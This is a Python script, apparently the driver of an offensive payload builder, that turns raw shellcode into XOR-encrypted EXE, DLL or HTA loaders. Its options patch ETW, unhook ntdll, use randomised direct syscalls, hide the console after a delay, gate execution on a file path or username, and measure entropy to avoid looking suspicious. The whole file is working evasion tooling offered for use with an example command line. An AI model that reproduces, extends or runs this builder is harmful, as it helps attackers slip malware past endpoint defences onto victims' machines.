import os
import argparse
from modules.domath import *
from modules.etw import *
from modules.exe import *
from modules.dll import *
from modules.fileexists import *
from modules.hooks import *
from modules.namegen import *
from modules.syscalls import *
from modules.username import *
from modules.xor import *
from modules.b64 import *
from modules.entropy import *
from templates.exe.generate_exe import *
from templates.dll.generate_dll import *
from templates.hta.hta import *


def main():

    epilog = """
Example Usage:
    
python3 jordanspecial.py --build exe --shellcode /home/shellcode.bin --etw --unhook ntdll.dll --file "C:/Users/Admin/Desktop/file.txt" --hide --user Admin
"""

    parser = argparse.ArgumentParser(epilog=epilog, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--build", metavar="", required=True, help="Choose 'exe', 'dll', or 'hta'")
    parser.add_argument("--shellcode", metavar="", required=True, help="File path to shellcode")
    parser.add_argument("--etw", action="store_true", required=False, help="Patch the EtwEventWrite API")
    parser.add_argument("--unhook", metavar="", required=False, help="Dll name to unhook")
    parser.add_argument("--file", metavar="", required=False, help="Check if a file path exists as an execution guardrail")
    parser.add_argument("--hide", action="store_true", required=False, help="Hides the console windows after calculating prime numbers for ~20s (exe only)")
    parser.add_argument("--user", metavar="", required=False, help="Check if the current user is the specified value as an execution guardrail")
    parser.add_argument("--out", metavar="", required=True, help="Name of output file")
    # add code signature arg

    args = parser.parse_args()

    build_type = args.build
    shellcode_file_path = args.shellcode
    patch_etw = args.etw
    dll_to_unhook = args.unhook
    check_if_file_exists = args.file
    hide_console = args.hide
    check_username = args.user
    output = args.out

    # Validate build parameters
    build_types = ["dll", "exe", "hta"]
    if build_type not in build_types:
        print("[-] Invalid build type selected: %s - choose exe, dll, or hta" % build_type)
        exit(0)

    # Build type agnostic args
    alloc = generate_random_name()
    writevm = generate_random_name()
    protectvm = generate_random_name()
    createthread = generate_random_name()
    createfile = generate_random_name()
    createsection = generate_random_name()
    mapview = generate_random_name()
    unmapview = generate_random_name()
    close_handle = generate_random_name()

    # Generate XOR template
    xor_key = generate_random_name()
    xor_key_var = generate_random_name()
    shellcode_var = generate_random_name()
    shellcode_len_var = generate_random_name()
    xor_function_name = generate_random_name()
    try:
        raw_shellcode = open(shellcode_file_path, 'rb').read()
    except:
        print("[-] Error reading shellcode file")
        exit(1)

    encrypted_shellcode = xor(raw_shellcode, xor_key)
    xor_template = generate_xor_template(xor_function_name, encrypted_shellcode, xor_key, shellcode_var, shellcode_len_var, xor_key_var)

    # Generate prime number + hide console template
    if hide_console:
        domath_function_name = generate_random_name()
        domath_template = generate_do_math(domath_function_name)
    else:
        domath_function_name = ""
        domath_template = ""

    # Generate file exist template
    if check_if_file_exists:
        file_exist_function_name = generate_random_name()
        file_exist_template = generate_file_exist_stub(file_exist_function_name, check_if_file_exists)
    else:
        file_exist_function_name = ""
        file_exist_template = ""

    # Generate check username template
    if check_username:
        user_function_name = generate_random_name()
        user_template = generate_username_check(user_function_name, check_username)
    else:
        user_function_name = ""
        user_template = ""

    # Generate unhook template
    if dll_to_unhook:
        unhook_function_name = generate_random_name()
        unhook_template = generate_unhooking_code(dll_to_unhook, unhook_function_name, createfile, createsection, mapview, protectvm, writevm, unmapview, close_handle)
    else:
        unhook_function_name = ""
        unhook_template = ""

    # Generate etw template
    if patch_etw:
        etw_function_name = generate_random_name()
        etw_template = generate_etw_patch(etw_function_name, protectvm, writevm)
    else:
        etw_function_name = ""
        etw_template = ""

    # Generate execution template
    execution_function_name = generate_random_name()
    execution_template = generate_exe_template(execution_function_name, xor_function_name, xor_key_var, shellcode_var, shellcode_len_var, createthread, protectvm, writevm)

    # Generate dll execution template
    dll_function_name = generate_random_name()
    dll_template = generate_dll_template(dll_function_name, xor_function_name, xor_key_var, shellcode_var, shellcode_len_var, createthread, protectvm, writevm, alloc)

    # Generate syscall stubs
    syscall_file_name = generate_random_name()
    generate_syscall_stubs(syscall_file_name, alloc, writevm, protectvm, createthread, createfile, createsection, mapview, unmapview, close_handle)


    # If EXE
    if build_type == "exe":
        exe_source = generate_exe_source(syscall_file_name, xor_template, domath_template, domath_function_name, file_exist_template, file_exist_function_name, user_template, user_function_name, etw_template, etw_function_name, unhook_template, unhook_function_name, execution_template, execution_function_name)
        with open("output/main.c", "w") as final_source:
            final_source.write(exe_source)
        final_source.close()

        compile_command = "x86_64-w64-mingw32-g++ ./output/main.c " + "./output/" + syscall_file_name + ".c" + " -w -masm=intel -fpermissive -static -O3 -lshlwapi -o output/" + output
        os.system(compile_command)
        print("[+] Compiled exe with args: %s" % compile_command)
        print("[+] Calculating entropy of %s (>6.8 is suspicious)" % output)
        entropy_check("output/" + output)

    # If DLL
    if build_type == "dll":
        export_name = generate_random_name()
        dll_source = generate_dll_source(syscall_file_name, xor_template, domath_template, domath_function_name, file_exist_template, file_exist_function_name, user_template, user_function_name, etw_template, etw_function_name, unhook_template, unhook_function_name, dll_template, dll_function_name, export_name)

        with open("output/main.c", "w") as final_source:
            final_source.write(dll_source)
        final_source.close()

        print("[+] Building DLL with export function: %s" % export_name)
        compile_command = "x86_64-w64-mingw32-g++ ./output/main.c " + "./output/" + syscall_file_name + ".c" + " -w -masm=intel -s -shared -fpermissive -Wl,--subsystem,windows -lshlwapi -static -O3 -o output/" + output
        os.system(compile_command)
        print("[+] Compiled dll with args: %s" % compile_command)
        print("[+] Calculating entropy of %s (>6.8 is suspicious)" % output)
        entropy_check("output/" + output)

    # If HTA
    if build_type == "hta":
        export_name = generate_random_name()
        dll_source = generate_dll_source(syscall_file_name, xor_template, domath_template, domath_function_name, file_exist_template, file_exist_function_name, user_template, user_function_name, etw_template, etw_function_name, unhook_template, unhook_function_name, dll_template, dll_function_name, export_name)

        with open("output/main.c", "w") as final_source:
            final_source.write(dll_source)
        final_source.close()

        print("[+] Building DLL with export function: %s" % export_name)
        compile_command = "x86_64-w64-mingw32-g++ ./output/main.c " + "./output/" + syscall_file_name + ".c" + " -w -masm=intel -s -shared -fpermissive -Wl,--subsystem,windows -lshlwapi -static -O3 -o temp.dll"
        os.system(compile_command)
        print("[+] Compiled dll with args: %s" % compile_command)
        print("[+] Calculating entropy of temp.dll (>6.8 is suspicious)")
        entropy_check("temp.dll")

        b64_dll = b64_encode_dll("./temp.dll")
        os.system("rm ./temp.dll")
        hta_out = build_hta_file(b64_dll, export_name)

        with open("output/" + output, "w") as hta_final:
            hta_final.write(hta_out)
        hta_final.close()
        print("[+] Built HTA file %s with base64 encoded embedded dll" % output)

main()